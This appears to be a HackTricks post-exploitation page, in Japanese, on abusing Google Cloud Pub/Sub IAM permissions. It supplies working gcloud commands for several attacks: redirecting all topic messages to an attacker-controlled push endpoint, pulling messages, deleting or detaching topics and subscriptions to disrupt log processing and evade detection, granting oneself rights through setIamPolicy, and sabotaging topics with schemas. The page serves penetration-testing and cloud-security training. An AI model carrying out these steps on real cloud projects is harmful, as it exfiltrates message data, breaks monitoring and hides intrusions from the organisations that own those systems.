# GCP - Pub/Sub Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Pub/Sub

Pub/Subの詳細については、次のページを参照してください：

{{#ref}}
../gcp-services/gcp-pub-sub.md
{{#endref}}

### `pubsub.topics.publish`

トピックにメッセージをpublishします。**予期しないデータを送信**して予期しない機能をトリガーしたり脆弱性を悪用したりするのに有用です：

<details>

<summary>トピックにメッセージを公開</summary>
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```
</details>

### `pubsub.topics.detachSubscription`

subscriptionがメッセージを受信しないようにするのに有用で、検知を回避するために使える場合がある。

<details>

<summary>トピックからsubscriptionをデタッチ</summary>
```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```
</details>

### `pubsub.topics.delete`

サブスクリプションがメッセージを受信するのを防ぎ、検出を回避するのに有用です。\
サブスクリプションがアタッチされている状態でも、トピックを削除することが可能です。

<details>

<summary>Delete topic</summary>
```bash
gcloud pubsub topics delete <TOPIC NAME>
```
</details>

### `pubsub.topics.update`

この権限を使用して、トピックの設定を更新して妨害できます。例: `--clear-schema-settings`、`--message-retention-duration`、`--message-storage-policy-allowed-regions`、`--schema`、`--schema-project`、`--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

自分に権限を付与して、前述のいずれかの攻撃を実行できるようにします。

### **`pubsub.subscriptions.create,`**`pubsub.topics.attachSubscription` , (`pubsub.subscriptions.consume`)

ウェブサーバー上のすべてのメッセージを取得する:

<details>

<summary>メッセージを受信するための push subscription を作成する</summary>
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
</details>

サブスクリプションを作成し、それを使用して **pull messages** を取得します:

<details>

<summary>pull subscription を作成してメッセージを取得する</summary>
```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```
</details>

### `pubsub.subscriptions.delete`

**サブスクリプションの削除** は、ログ処理システムなどを中断するのに役立つことがあります:

<details>

<summary>サブスクリプションの削除</summary>
```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```
</details>

### `pubsub.subscriptions.update`

この権限を使って、メッセージがアクセスできる場所（URL、Big Query table、Bucket）に保存されるよう設定を更新したり、単に妨害したりできます。

<details>

<summary>サブスクリプションのエンドポイントを更新</summary>
```bash
gcloud pubsub subscriptions update --push-endpoint <your URL> <subscription-name>
```
</details>

### `pubsub.subscriptions.setIamPolicy`

前述の攻撃を実行するために必要な権限を自分に付与します。

### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

スキーマをトピックにアタッチして、メッセージがそのスキーマを満たさなくなるようにし、結果としてトピックを妨害します。\
スキーマが存在しない場合は、新しく作成する必要があるかもしれません。

<details>

<summary>スキーマファイルを作成してトピックにアタッチ</summary>
```json:schema.json
{
"namespace": "com.example",
"type": "record",
"name": "Person",
"fields": [
{
"name": "name",
"type": "string"
},
{
"name": "age",
"type": "int"
}
]
}
```

```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
--schema=projects/<project-name>/schemas/<topic-id> \
--message-encoding=json
```
</details>

### `pubsub.schemas.delete`

スキーマを削除すると、スキーマに適合しないメッセージを送信できるように見えるかもしれません。しかし、スキーマが削除されるため、実際にはトピックにメッセージは入らないでしょう。したがって、これは **無意味**:

<details>

<summary>スキーマを削除（役に立たない）</summary>
```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```
</details>

### `pubsub.schemas.setIamPolicy`

前述の攻撃のいずれかを実行するために必要な権限を自分に付与します。

### `pubsub.snapshots.create`, `pubsub.snapshots.seek`

これはACKされていないすべてのメッセージのスナップショットを作成し、それらをサブスクリプションに戻します。攻撃者にはあまり有用ではありませんが、以下の通りです：

<details>

<summary>スナップショットを作成してシークする</summary>
```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
--subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
--snapshot=YOUR_SNAPSHOT_NAME
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
